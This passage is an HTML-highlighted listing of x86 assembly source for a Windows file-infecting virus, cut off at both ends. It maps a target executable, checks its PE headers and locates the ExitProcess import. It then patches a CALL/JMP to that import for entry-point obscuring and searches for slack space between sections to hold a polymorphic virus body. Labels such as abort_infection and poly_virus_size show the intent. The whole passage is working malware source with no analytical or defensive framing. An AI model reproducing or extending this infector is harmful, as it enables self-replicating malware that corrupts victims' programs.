        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; low dword of filesize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high dword of filesize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; security attributes (shit)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.filehandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.maphandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">close_file_error</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; map the whole file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; low dword of fileoffset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high dword of fileoffset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; read/write access</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; maphandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.mapbase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">closefilemapping</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; ImageBase</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.imagebase_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                          </span><span class="sc1">; store it in poly decryptor</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">                            </span><span class="sc1">; fileheader size</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; optional header size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Number of sections</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; import table RVA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_section</span><span class="sc0">

</span><span class="sc5">find_kernel32_import_descriptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; dll name RVA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; already last import descr?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">failure_exit_with_one_popa</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">                       </span><span class="sc1">; lowercase</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"nrek"</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">search_next_import_descriptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"23le"</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_kernel32_import_descriptor</span><span class="sc0">

</span><span class="sc5">search_next_import_descriptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">find_kernel32_import_descriptor</span><span class="sc0">

</span><span class="sc5">found_kernel32_import_descriptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; API names ptr array ptr</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">kernel32_imports_ok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">kernel32_imports_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">search_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">search_ExitProcess_failed</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.start_virusbody</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_ExitProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">l_ExitProcess</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_ExitProcess</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">search_ExitProcess</span><span class="sc0">

</span><span class="sc5">search_ExitProcess_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">failure_exit_with_one_popa</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">

</span><span class="sc5">found_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; API RVAs array ptr</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; ImageBase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.EPO_API_VA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ESI=EntryRVA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; PointerToRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.EPO_API_VA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">search_JMP_CALL_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                </span><span class="sc1">; search for a possible API</span><span class="sc0">
                                                </span><span class="sc1">; call opcode</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">searchon_JMP_CALL_ExitProcess</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">searchon_JMP_CALL_ExitProcess</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">               </span><span class="sc1">; is there a CALL [imm32] ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_CALL_ExitProcess</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">               </span><span class="sc1">; is there a JMP [imm32] ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_JMP_ExitProcess</span><span class="sc0">
</span><span class="sc5">searchon_JMP_CALL_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">search_JMP_CALL_ExitProcess</span><span class="sc0">

</span><span class="sc5">search_JMP_CALL_ExitProcess_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">

</span><span class="sc5">found_JMP_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_opcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">     </span><span class="sc1">; jmp near</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">save_epo_address</span><span class="sc0">

</span><span class="sc5">found_CALL_ExitProcess</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_opcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">     </span><span class="sc1">; call near</span><span class="sc0">

</span><span class="sc5">save_epo_address</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_offset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EAX=mapbase</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; PointerToRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; VirtualAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.epo_RVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.write_section_RVA_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">search_writeable_section_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">080000000h</span><span class="sc0">    </span><span class="sc1">; is section writeable?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">not_writeable</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0">       </span><span class="sc1">; VirtualSize of sect. n</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">not_writeable</span><span class="sc0">                        </span><span class="sc1">; section not big enough</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; VirtualAddress of sect. n</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">; save it</span><span class="sc0">
</span><span class="sc5">not_writeable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                            </span><span class="sc1">; next section header</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">search_writeable_section_loop</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">search_section_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; VirtualAddress of sect. n+1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; VirtualAddress of sect. n</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; VirtualSize of sect. n</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">VirtualSize_OK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; SizeOfRawData of sect. n</span><span class="sc0">
</span><span class="sc5">VirtualSize_OK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.poly_virus_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">found_section</span><span class="sc0">
</span><span class="sc5">next_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                            </span><span class="sc1">; next section header</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">search_section_loop</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">abort_infection</span><span class="sc0">

</span><span class="sc5">found_section</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; add VirtualAddr. of sect. n</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.virus_RVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; store virus-RVA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ESI=PointerToRawData sect n</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; is it a BSS section ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">not_BSS</span><span class="sc0">
